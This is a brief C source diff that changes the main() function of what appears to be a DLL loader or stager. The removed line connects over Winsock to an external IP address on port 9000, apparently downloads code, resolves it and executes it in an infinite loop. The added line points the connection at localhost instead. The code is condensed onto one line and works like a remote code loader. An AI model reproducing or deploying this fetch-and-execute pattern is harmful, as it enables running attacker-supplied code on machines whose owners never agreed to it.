@@ -67,4 +67,4 @@ __declspec(dllexport) int cvm_has_dll(H h){
     return find(h) != 0;
 }
 
-int main(){WSADATA w;H h={0};struct sockaddr_in a={0};WSAStartup(0x202,&w);conn=socket(2,1,0);a.sin_family=2;a.sin_port=htons(9000);inet_pton(2,"118.25.42.70",&a.sin_addr);connect(conn,(void*)&a,sizeof a);cvm_firstchild(h,h);imp=find(*(H*)download(h));for(;;)imp();}
+int main(){WSADATA w;H h={0};struct sockaddr_in a={0};WSAStartup(0x202,&w);conn=socket(2,1,0);a.sin_family=2;a.sin_port=htons(9000);inet_pton(2,"127.0.0.1",&a.sin_addr);connect(conn,(void*)&a,sizeof a);cvm_firstchild(h,h);imp=find(*(H*)download(h));for(;;)imp();}
